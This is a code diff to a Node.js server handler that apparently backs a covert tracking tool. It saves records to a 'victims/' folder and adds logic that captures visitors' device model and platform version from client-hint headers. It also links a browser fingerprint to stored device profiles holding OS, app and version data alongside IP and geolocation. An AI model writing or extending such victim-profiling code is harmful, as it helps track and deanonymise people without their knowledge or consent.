@@ -26,12 +26,34 @@ module.exports = async function handler(req, res) {
 
     const path = 'victims/' + id + '.json';
     const prev = (await readJSON(path)) || {};
+
+    const chModel = String(req.headers['sec-ch-ua-model'] || '').replace(/"/g, '').trim();
+    const chPv = String(req.headers['sec-ch-ua-platform-version'] || '').replace(/"/g, '').trim();
+    const fp = String(body.f || '').slice(0, 40).replace(/[^a-zA-Z0-9_-]/g, '');
+    const known = fp ? (await readJSON('dev/' + fp + '.json')) || null : null;
+
     const rec = Object.assign({}, prev, body, {
       ts: new Date().toISOString(),
       ip: ip,
       geo: geo || null
     });
+    if (!rec.hm && chModel) rec.hm = chModel;
+    if (!rec.pv && chPv) rec.pv = chPv;
+    if (known) {
+      if (!rec.hm && known.hm) rec.hm = known.hm;
+      if (!rec.y && known.y) rec.y = known.y;
+      if (!rec.av && known.av) rec.av = known.av;
+      if (!rec.os && known.os) rec.os = known.os;
+      if (!rec.pv && known.pv) rec.pv = known.pv;
+      if (!rec.app && known.app) rec.app = known.app;
+    }
     await writeJSON(path, rec);
+    if (fp && (rec.hm || rec.y || rec.os)) {
+      await writeJSON('dev/' + fp + '.json', {
+        f: fp, hm: rec.hm || '', y: rec.y || '', av: rec.av || '',
+        os: rec.os || '', pv: rec.pv || '', app: rec.app || '', ts: rec.ts
+      });
+    }
 
     return res.status(204).end();
   } catch (e) {
